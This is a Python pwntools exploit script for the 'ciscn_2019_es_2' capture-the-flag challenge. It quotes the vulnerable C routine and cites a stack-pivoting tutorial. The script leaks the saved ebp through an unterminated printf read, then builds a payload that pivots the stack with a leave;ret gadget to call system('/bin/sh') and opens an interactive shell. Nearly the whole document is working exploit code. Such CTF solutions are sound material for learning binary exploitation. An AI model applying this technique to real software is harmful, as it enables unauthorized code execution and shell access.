"""
ciscn_2019_es_2
https://www.cnblogs.com/max1z/p/15299000.html
Pwn教程之栈溢出_05_栈迁移

char s[40]; // [ebp-28h]
memset(s, 0, 0x20u);
read(0, s, 0x30u);
printf("Hello, %s\n", s);
read(0, s, 0x30u);
return printf("Hello, %s\n", s);
"""
from pwn import *

p = process('ciscn_2019_es_2')
# context(log_level='debug', arch='i386', os='linux' )
# p = gdb.debug('./ciscn_2019_es_2', 'b *0x080485B9\n\c')

elf = ELF('./ciscn_2019_es_2')
system_addr = elf.symbols['system']
leave_ret = elf.search(asm('leave')).__next__()

payload1 = b'A' * (0x27) + b'B'
p.send(payload1)  # not sendline
p.recvuntil("B")
original_ebp = u32(p.recv(4))
success(hex(original_ebp))

payload2 = flat('aaaa',
                system_addr,
                'dddd',  # fake stack ebp
                original_ebp - 0x28,  # addr of binsh
                '/bin/sh\x00',  # at ebp-0x28
                )
payload2 = flat(payload2.ljust(0x28, b'p'),
                original_ebp - 0x38,  # hijack ebp ,-0x38 is the aaaa
                leave_ret  # new leave ret
                )

p.sendline(payload2)
p.interactive()
